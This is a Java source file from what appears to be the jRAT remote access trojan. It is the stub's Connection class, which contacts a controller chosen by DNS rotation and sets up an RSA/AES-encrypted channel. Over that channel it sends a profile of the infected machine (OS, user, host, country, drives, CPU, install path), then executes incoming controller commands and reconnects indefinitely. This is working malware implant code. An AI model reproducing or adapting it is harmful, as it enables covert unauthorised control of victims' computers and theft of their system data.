package io.jrat.stub;

import io.jrat.common.ConnectionCodes;
import io.jrat.common.crypto.Crypto;
import io.jrat.common.crypto.CryptoUtils;
import io.jrat.common.crypto.ObfuscatedStreamKeyExchanger;
import io.jrat.common.crypto.StreamKeyExchanger;
import io.jrat.common.io.StringWriter;
import io.jrat.stub.packets.incoming.AbstractIncomingPacket;
import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
import io.jrat.stub.packets.outgoing.Packet10InitInstallPath;
import io.jrat.stub.packets.outgoing.Packet11InitInstallationDate;
import io.jrat.stub.packets.outgoing.Packet12InitLocalAddress;
import io.jrat.stub.packets.outgoing.Packet13InitTotalMemory;
import io.jrat.stub.packets.outgoing.Packet14InitAvailableCores;
import io.jrat.stub.packets.outgoing.Packet15InitJavaPath;
import io.jrat.stub.packets.outgoing.Packet16LoadedPlugins;
import io.jrat.stub.packets.outgoing.Packet17InitDrives;
import io.jrat.stub.packets.outgoing.Packet18InitMonitors;
import io.jrat.stub.packets.outgoing.Packet19InitCPU;
import io.jrat.stub.packets.outgoing.Packet1InitHandshake;
import io.jrat.stub.packets.outgoing.Packet20Headless;
import io.jrat.stub.packets.outgoing.Packet2Status;
import io.jrat.stub.packets.outgoing.Packet3Initialized;
import io.jrat.stub.packets.outgoing.Packet4InitOperatingSystem;
import io.jrat.stub.packets.outgoing.Packet5InitUserHost;
import io.jrat.stub.packets.outgoing.Packet6InitVersion;
import io.jrat.stub.packets.outgoing.Packet7InitServerID;
import io.jrat.stub.packets.outgoing.Packet8InitCountry;
import io.jrat.stub.packets.outgoing.Packet9InitJavaVersion;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.PublicKey;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Connection implements Runnable {

	private Socket socket;
	private FrameChat frameChat;

	private InputStream inputStream;
	private OutputStream outputStream;

	private DataInputStream dis;
	private DataOutputStream dos;

	private float protocolVersion;

	public PublicKey pubKey;
	
	public void run() {
		try {
			Address address = DnsRotator.getNextAddress();

			socket = new Socket(address.getAddress(), address.getPort());

			socket.setSoTimeout(Configuration.getTimeout());

			this.inputStream = socket.getInputStream();
			this.outputStream = socket.getOutputStream();

			this.dis = new DataInputStream(inputStream);
			this.dos = new DataOutputStream(outputStream);
	        
			outputStream.write(ConnectionCodes.DESKTOP_SLAVE);
			
			StreamKeyExchanger exchanger = new ObfuscatedStreamKeyExchanger(Main.getKeyPair(), dis, dos);
			pubKey = exchanger.readRemoteKey();
			exchanger.writePublicKey();
			
			int keylen = dis.readInt();
			int ivlen = dis.readInt();
			byte[] encKey = new byte[keylen];
			byte[] biv = new byte[ivlen];
			dis.readFully(encKey);
			dis.readFully(biv);
			Main.aesKey = Crypto.decrypt(encKey, Main.getKeyPair().getPrivate(), "RSA");
			biv = Crypto.decrypt(biv, Main.getKeyPair().getPrivate(), "RSA");
					
			SecretKeySpec secretKey = new SecretKeySpec(Main.aesKey, "AES");
			IvParameterSpec iv = new IvParameterSpec(biv);
						
			Cipher inCipher = CryptoUtils.getStreamCipher(Cipher.DECRYPT_MODE, secretKey, iv);
			Cipher outCipher = CryptoUtils.getStreamCipher(Cipher.ENCRYPT_MODE, secretKey, iv);
			
			this.inputStream = new CipherInputStream(socket.getInputStream(), inCipher);
			this.outputStream = new CipherOutputStream(socket.getOutputStream(), outCipher);

			this.dis = new DataInputStream(inputStream);
			this.dos = new DataOutputStream(outputStream);

			initialize();

			status(Constants.STATUS_READY);

			for (Plugin plugin : Plugin.list) {
				plugin.methods.get("onconnect").invoke(plugin.instance, new Object[] { dis, dos });
			}
			
			while (true) {
				short header = readShort();
				
				AbstractIncomingPacket.execute(this, header);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			FileSearch.stopSearch();
			try {
				Thread.sleep(Configuration.getConnectionDelay() * 1000L);
				new Thread(this).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public void initialize() throws Exception {
		addToSendQueue(new Packet1InitHandshake());	
		refreshInit();		
		addToSendQueue(new Packet3Initialized());
	}
	
	public void refreshInit() {
		addToSendQueue(new Packet4InitOperatingSystem());
		addToSendQueue(new Packet5InitUserHost());	
		addToSendQueue(new Packet6InitVersion());
		addToSendQueue(new Packet7InitServerID());
		addToSendQueue(new Packet8InitCountry());
		addToSendQueue(new Packet9InitJavaVersion());
		addToSendQueue(new Packet10InitInstallPath());
		addToSendQueue(new Packet11InitInstallationDate());
		addToSendQueue(new Packet12InitLocalAddress());
		addToSendQueue(new Packet13InitTotalMemory());
		addToSendQueue(new Packet14InitAvailableCores());
		addToSendQueue(new Packet15InitJavaPath());
		addToSendQueue(new Packet16LoadedPlugins());
		addToSendQueue(new Packet17InitDrives());
		addToSendQueue(new Packet18InitMonitors());
		addToSendQueue(new Packet19InitCPU());
		addToSendQueue(new Packet20Headless());
	}

	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
		packet.send(dos, getStringWriter());
	}

	public boolean isConnected() {
		return socket.isConnected() && !socket.isClosed();
	}

	public void writeLine(String s) {
		if (s == null) {
			Main.debug("String is null!");
			s = "";
		}
		try {
			dos.writeShort(s.length());
			dos.writeChars(s);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() {
		try {
			short len = dis.readShort();

			StringBuilder builder = new StringBuilder();
			for (int i = 0; i < len; i++) {
				builder.append(dis.readChar());
			}

			String s = builder.toString();

			return s;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	public void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public short readShort() throws Exception {
		return dis.readShort();
	}

	public byte readByte() throws Exception {
		return dis.readByte();
	}

	public void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public int readInt() throws Exception {
		return dis.readInt();
	}

	public void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public long readLong() throws Exception {
		return dis.readLong();
	}

	public void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}
	
	public double readDouble() throws Exception {
		return dis.readDouble();
	}
	
	public void writeDouble(double d) throws Exception {
		dos.writeDouble(d);
	}

	public void writeLine(Object obj) throws Exception {
		writeLine(obj.toString());
	}

	public void status(int status) {
		addToSendQueue(new Packet2Status(status));
	}
	
	public DataInputStream getDataInputStream() {
		return dis;
	}
	
	public DataOutputStream getDataOutputStream() {
		return dos;
	}
	
	public void setFrameChat(FrameChat frame) {
		this.frameChat = frame;
	}
	
	public FrameChat getFrameChat() {
		return this.frameChat;
	}

	public Socket getSocket() {
		return this.socket;
	}
	
	public StringWriter getStringWriter() {
		return new StringWriter() {
			@Override
			public void writeLine(String s) throws Exception {
				Connection.this.writeLine(s);
			}
		};
	}
}
